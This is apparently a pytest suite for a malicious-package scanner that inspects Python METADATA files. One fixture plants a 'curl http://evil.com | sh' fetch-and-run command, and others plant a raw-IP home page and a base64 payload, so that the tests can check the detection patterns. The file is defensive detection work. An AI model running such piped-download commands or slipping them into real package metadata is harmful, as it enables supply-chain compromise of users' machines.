from pathlib import Path
from vlnr.vuln_metadata import scan_metadata


def test_metadata_detect_shell_command(tmp_path: Path) -> None:
    """METADATA with 'curl http://evil.com | sh' in Description is flagged"""
    dist_info = tmp_path / "test-1.0.dist-info"
    dist_info.mkdir()
    metadata = dist_info / "METADATA"
    metadata.write_text("Name: test\nVersion: 1.0\nDescription: Install via curl http://evil.com | sh")

    signals = scan_metadata(dist_info)
    assert any(s.pattern_matched == "curl" for s in signals)
    assert any(s.pattern_matched == "| sh" for s in signals)


def test_metadata_detect_suspicious_url(tmp_path: Path) -> None:
    """METADATA with suspicious URL in Home-page is flagged"""
    dist_info = tmp_path / "test-1.0.dist-info"
    dist_info.mkdir()
    metadata = dist_info / "METADATA"
    metadata.write_text("Name: test\nVersion: 1.0\nHome-page: http://1.2.3.4/evil")

    signals = scan_metadata(dist_info)
    assert any("1.2.3.4" in s.pattern_matched for s in signals)


def test_metadata_detect_encoded_payload(tmp_path: Path) -> None:
    """METADATA with base64-encoded payload in Summary is flagged"""
    dist_info = tmp_path / "test-1.0.dist-info"
    dist_info.mkdir()
    metadata = dist_info / "METADATA"
    # base64 for "import os; os.system('ls')" is aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk=
    metadata.write_text("Name: test\nVersion: 1.0\nSummary: aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk=")

    signals = scan_metadata(dist_info)
    assert any(
        s.field == "Summary" and "base64" in s.severity.lower() or "encoded" in s.severity.lower() for s in signals
    )


def test_metadata_clean_package(tmp_path: Path) -> None:
    """Clean METADATA produces no signals"""
    dist_info = tmp_path / "test-1.0.dist-info"
    dist_info.mkdir()
    metadata = dist_info / "METADATA"
    metadata.write_text("Name: test\nVersion: 1.0\nSummary: A clean package\nDescription: Long description")

    signals = scan_metadata(dist_info)
    assert len(signals) == 0


def test_metadata_parse_rfc822(tmp_path: Path) -> None:
    """Correctly parses RFC 822-style METADATA fields"""
    dist_info = tmp_path / "test-1.0.dist-info"
    dist_info.mkdir()
    metadata = dist_info / "METADATA"
    metadata.write_text("Name: test\nVersion: 1.0\nAuthor: Someone\n\nFull description follows here.")

    # Just verify it doesn't crash on standard METADATA
    signals = scan_metadata(dist_info)
    assert isinstance(signals, list)


def test_metadata_missing_file(tmp_path: Path) -> None:
    """Missing METADATA file returns empty results gracefully"""
    signals = scan_metadata(tmp_path)
    assert signals == []
